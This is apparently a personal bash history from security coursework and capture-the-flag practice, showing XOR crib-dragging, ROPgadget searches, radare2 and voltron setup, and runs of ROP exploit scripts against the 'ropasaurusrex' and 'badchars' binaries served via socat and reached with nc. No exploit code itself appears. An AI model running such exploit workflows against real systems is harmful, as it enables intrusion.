cribdrag 274c10121a0100495b502d551c557f0b0833585d1b27030b5228040d3753490a1c025415051525455118001911534a0052560a14594f0b1e490a010c4514411e070014615a181b02521b580305170002074b0a1a4c414d1f1d171d00151b1d0f480e491e0249010c150050115c505850434203421354424c1150430b5e094d144957080d4444254643
cd 
jacl
hack
cribdrag 274c10121a0100495b502d551c557f0b0833585d1b27030b5228040d3753490a1c025415051525455118001911534a0052560a14594f0b1e490a010c4514411e070014615a181b02521b580305170002074b0a1a4c414d1f1d171d00151b1d0f480e491e0249010c150050115c505850434203421354424c1150430b5e094d144957080d4444254643
ls
hack
hack
vagrant --help
ls
subl Vagrantfile 
hack
pwd
hack
ls
./setup.sh 
vagrant --help
vagrant validate Vagrantfile 
vagrant provision Vagrantfile 
ls
cp Vagrantfile vagrantserverfile
vagrant provision vagrantserverfile 
ls
rm vagrantserverfile 
ls
./Vagrantfile 
hack
ls
subl setup.sh 
ls
vagrant --help
vagrant provision Vagrantfile 
vagrant reload Vagrantfile 
vagrant init Vagrantfile 
vagrant halt Vagrantfile 
vagrant validate Vagrantfile 
hack
ls
ls
ls -a
ls
unlink
ls
git add setup.sh 
git add Vagrantfile 
git commit -m "updated"
git push
ls
ls -l
ls
ls -a
cd .vagrant/machines/default/virtualbox/
ls
ls -a
cd ../
ls
ls -a
cd ../
ls
ls -a
cd ../
ls
ls -a
cd ../
ls
hack
ls
./r
ascii
sudo apt install ascii
ascii
cd ../../infosec/6441/crypto/rotten/
ls
ls
hack
ls
vagrant --help
ls
vagrant destroy
vagrant reload
vagrant --help
vagrant halt
vagrant destroy
vagrant init
subl .
vagrant validate
vagrant init
vagrant up
sudo apt --help
apt --help
sudo apt update
sudo apt upgrade
ls
subl Vagrantfile 
cd /home/enigma/gits/infosec/
ls
cd cysca/
cd ../
cd ctfs/
ls
cd ../
ls
hack
vagrant --help
vagrant reload
vagrant provision
hack
vagrant provision
hack
cd
cd gits/infosec/cysca/week_1
ls
cd badchar/
ROPgadget --binary ./badchars | grep pop
ROPgadget --binary ./badchars | grep mov
cd
cd gits/repos/
ls
cd cysca/
ls
cd challenges/week0/
ls
cd badcharsrop/
ls
cd writeups/
ls
cd ../
cat readme.md 
cd writeups/
ls
touch writeup.txt
subl writeup.txt 
cd ../../../../
git pull
cd challenges/week0/badcharsrop/writeups/
ls
git add writeup.txt 
git commit -m "badcharsrop writeup and exploit"
git push
ls
mv writeup.txt writeup.md
touch exploit.py
subl exploit.py 
git add .
git commit -m "markdown writeup"
git push
comp2521
comp 2521
ls
cd labs/
ls
cd lab07
ls
cd ../
cd lab08
ls
cd ../
ls
cd lab06
ls
cd ../
cd lab05
ls
cd ../
ls
cd lab05
ls
cd ../
cd lab04
ls
cd lab08
ls
cd ../
ls
lab08
ls
cd lab08
ls
atom .
hack
subl rotten
hex
sudo apt install hexedit
hexedit ./rotten 
cribdrag u8fI5Maa4tKD0+ff6Nfi0X/Sytjn0Q1aKwwCRehFTE1N90M/4/IwOVBDOWRsemZlXK2xv7IXrLIDU56oxKue1ozt29PPFRotF0O2BmvCEw8sywdKrE9A8zN2jJiFqCl5izZ7dJ4wQlT6tLZYpZb5AfMMSd/smuDYvpaxxl8nKsvRtjp2ZoCyTRikLj00+yPmzJCYL/Epo+LL7iZtfg2TqZhuQxPW2P2hVkkMVetPRtnngQcV/Y6pgkg9cBWCU2O9WsKr+VPmaHsd9xyirbPVh6K61SK/MOYDm0va4D1gj8IO0zf5CyE9liSiBmr8vT5Fq4yZGXY4qV4rj6wKRAMm0G4ssbnL9PqMlpoOw5nKtlOyI49E4UwmJzFVXvUEAS4pBTktuCSWmY0BtIuIo3XSXWkhkJtuoJUsRPj+8iEcAPXdfyLP0pX4ANPMtZm9GGBkkJBoWk+rLBhACWcgQEXVAB6KxMn+sMvJvBBNOINYtHBzeQkxme02KmEbNDcjb7Cq5NItz9brgqENXLOJwHqTlg==
cribdrag
cribdrag asdf
pip install binascii
base64 -d u8fI5Maa4tKD0+ff6Nfi0X/Sytjn0Q1aKwwCRehFTE1N90M/4/IwOVBDOWRsemZlXK2xv7IXrLIDU56oxKue1ozt29PPFRotF0O2BmvCEw8sywdKrE9A8zN2jJiFqCl5izZ7dJ4wQlT6tLZYpZb5AfMMSd/smuDYvpaxxl8nKsvRtjp2ZoCyTRikLj00+yPmzJCYL/Epo+LL7iZtfg2TqZhuQxPW2P2hVkkMVetPRtnngQcV/Y6pgkg9cBWCU2O9WsKr+VPmaHsd9xyirbPVh6K61SK/MOYDm0va4D1gj8IO0zf5CyE9liSiBmr8vT5Fq4yZGXY4qV4rj6wKRAMm0G4ssbnL9PqMlpoOw5nKtlOyI49E4UwmJzFVXvUEAS4pBTktuCSWmY0BtIuIo3XSXWkhkJtuoJUsRPj+8iEcAPXdfyLP0pX4ANPMtZm9GGBkkJBoWk+rLBhACWcgQEXVAB6KxMn+sMvJvBBNOINYtHBzeQkxme02KmEbNDcjb7Cq5NItz9brgqENXLOJwHqTlg==
base64 --help
echo "u8fI5Maa4tKD0+ff6Nfi0X/Sytjn0Q1aKwwCRehFTE1N90M/4/IwOVBDOWRsemZlXK2xv7IXrLIDU56oxKue1ozt29PPFRotF0O2BmvCEw8sywdKrE9A8zN2jJiFqCl5izZ7dJ4wQlT6tLZYpZb5AfMMSd/smuDYvpaxxl8nKsvRtjp2ZoCyTRikLj00+yPmzJCYL/Epo+LL7iZtfg2TqZhuQxPW2P2hVkkMVetPRtnngQcV/Y6pgkg9cBWCU2O9WsKr+VPmaHsd9xyirbPVh6K61SK/MOYDm0va4D1gj8IO0zf5CyE9liSiBmr8vT5Fq4yZGXY4qV4rj6wKRAMm0G4ssbnL9PqMlpoOw5nKtlOyI49E4UwmJzFVXvUEAS4pBTktuCSWmY0BtIuIo3XSXWkhkJtuoJUsRPj+8iEcAPXdfyLP0pX4ANPMtZm9GGBkkJBoWk+rLBhACWcgQEXVAB6KxMn+sMvJvBBNOINYtHBzeQkxme02KmEbNDcjb7Cq5NItz9brgqENXLOJwHqTlg==" | base64 -d
cribdrag 
Z+EELMMC?09PC9dlzfe\S-Ck,JO@3v)y6{t0BTXI_'*:vfM.=4#/)&m~
nCVIUOFH=pScZSh{"0K=`7!=$j>Ev8^+
D&n,S#DL&'1U^.)9-$u]i!n,D!"`dhZO,@g @EM8Xpsy16*a47#o-
\z
cd ../
ls
cd rollingthunder/one/
cd ../../
atom .
cribdrag u8fI5Maa4tKD0+ff6Nfi0X/Sytjn0Q1aKwwCRehFTE1N90M/4/IwOVBDOWRsemZlXK2xv7IXrLIDU56oxKue1ozt29PPFRotF0O2BmvCEw8sywdKrE9A8zN2jJiFqCl5izZ7dJ4wQlT6tLZYpZb5AfMMSd/smuDYvpaxxl8nKsvRtjp2ZoCyTRikLj00+yPmzJCYL/Epo+LL7iZtfg2TqZhuQxPW2P2hVkkMVetPRtnngQcV/Y6pgkg9cBWCU2O9WsKr+VPmaHsd9xyirbPVh6K61SK/MOYDm0va4D1gj8IO0zf5CyE9liSiBmr8vT5Fq4yZGXY4qV4rj6wKRAMm0G4ssbnL9PqMlpoOw5nKtlOyI49E4UwmJzFVXvUEAS4pBTktuCSWmY0BtIuIo3XSXWkhkJtuoJUsRPj+8iEcAPXdfyLP0pX4ANPMtZm9GGBkkJBoWk+rLBhACWcgQEXVAB6KxMn+sMvJvBBNOINYtHBzeQkxme02KmEbNDcjb7Cq5NItz9brgqENXLOJwHqTlg
cribdrag u8fI5Maa4tKD0pff6Nfi0XsSytjn0Q1aKwwCRehFTE1N90Ms4sIwOVBDOWRsemZlXK2xv7IXrLIDU56oxKue1ozt29PPFRotF0O2BmvCEw8sywdKrE9A8zN2jJiFqCl5izZ7dJ4wQlT6tLZYpZb5AfMMSdssmuDYvpaxxl8nKsvRtjp2ZoCyTRikLj00pyPmzJCYLsEpopLL7iZtfg2TqZhuQxPW2P2hVkkMVetPRtnngQcVsY6pgkg9cBWCU2O9WsKrpVPmaHsd9xyirbPVh6K61SKsMOYDm0va4D1gj8IO0zf5CyE9liSiBmr8vT5Fq4yZGXY4qV4rj6wKRAMm0G4ssbnL9PqMlpoOw5nKtlOyI49E4UwmJzFVXvUEAS4pBTktuCSWmY0BtIuIo3XSXWkhkJtuoJUsRPjp8iEcAPXdfyLP0pX4ANPMtZm9GGBkkJBoWkprLBhACWcgQEXVAB6KxMnpsMvJvBBNOINYtHBzeQkxme02KmEbNDcjb7Cq5NItz9brgqENXLOJwHqTlg
ls
cd
subl test.c
python
cd gits/infosec/6441/reversing/esreverer/
ls
./r1 
ls
r2 ./r1 
radare
sudo apt install r2
r2
radare
git clone https://github.com/radare/radare2
ls
cd ../../../
cd ../
ls
cd software/
ls
git clone https://github.com/radare/radare2
cd radare2
git pull
ls
sys/install.sh 
r2
radare2
ls
./configure
ls
r2
reboot
r2
cd gits/software/radare2/
sudo sys/install.sh
r2
ls
cd ../../infosec/6441/reversing/esreverer/
ls
r2 ./r1 
cd
cd gits/infosec/
ls
cd ../
cd repos/
ls
cd cysca/
ls
cd challenges/week0/
ls
cd badcharsrop/
ls
cd writeups/
ls
mv exploit.py hpy.py
mv writeup.md hpy.py 
ls
git stash
ls
mv exploit.py hpy.py
mv writeup.md hpy.md
ls
cat hpy.md 
cat hpy.py 
ls
subl hpy.md 
git add .
git commit -m "renamed to convention"
git push
cd
cd gits/repos/
ls
cd ../
cd software/
ls
git clone "https://github.com/snare/voltron.git"
sudu voltron/
ls
cd voltron/
ls
./setup.py 
./install.sh 
gdb
cd
subl .bash_aliases 
reload
voltron
cd ~/gits/software/voltron
ls
cd voltron/
ls
voltron
reload
voltron
pip install blessed
sudo -H pip install blessed
voltron
sudo -H pip3 install blessed
voltron 
sudo -H pip3 install voltron
voltron
ls
ls -a
chmod +r+w secret-key-9D46CF78.asc 
ls -a
cp secret-key-9D46CF78.asc secret-key
su
sudo su
ls -a
cat secret-key-9D46CF78.asc 
ls
rm secret-key-9D46CF78.asc 
sudo su
ls
cd ../
cmd exploit.py
subl exploit.py
mv exploit.py Rop.py
subl exploit.py
ls
python ./exploit.py 
ls
subl Rop.py
python ./exploit.py 
chmod +x ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d 
python ./exploit.py 
checksec
checksec ropas*
ls
mv ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d ropasaurusrex
ls
python ./exploit.py 
ls
rm exploit.py 
ls
rm ropasaurusrex
ls
cd ropasaurusrex-master/
ls
./run_breaker.sh 
ls
./breaker.hs 
./checksec.sh 
ls
cd ../
mv ropasaurusrex-master/ ~/
ls
cd 
cd ropasaurusrex-master/
ls
./breaker.hs 
./run_breaker.sh 
ls
./breaker.hs 
ls
subl exploit.py
ls
LD_PRELOAD=./libc.so.6-f85c96c8fc753bfa75140c39501b4cd50779f43a socat TCP-LISTEN:12345,reuseaddr,fork EXEC:"./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d" 
LD_PRELOAD=./libc.so.6-f85c96c8fc753bfa75140c39501b4cd50779f43a socat TCP-LISTEN:12345,reuseaddr,fork EXEC:"strace -fi ./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d"
ls
LD_PRELOAD=./libc.so.6-f85c96c8fc753bfa75140c39501b4cd50779f43a socat TCP-LISTEN:12345,reuseaddr,fork EXEC:"strace -fi ./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d"
LD_PRELOAD=./libc.so.6 socat TCP-LISTEN:12345,reuseaddr,fork EXEC:"strace -fi ./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d"
cd ropasaurusrex-master/
ls
python ./exploit.py 
ls
python ./exploit.py 
python ./exploit2.py 
python3 ./exploit2.py 
ls
python3 ./exploit2.py 
python ./exploit2.py 
ls
python ./exploit2.py 
cd ropasaurusrex-master/
ls
python ./exploit2.py 
hack
dns-switch 
nc cysca.redobelisk.com 6005
./exploit.rb ls
subl sploit.rb
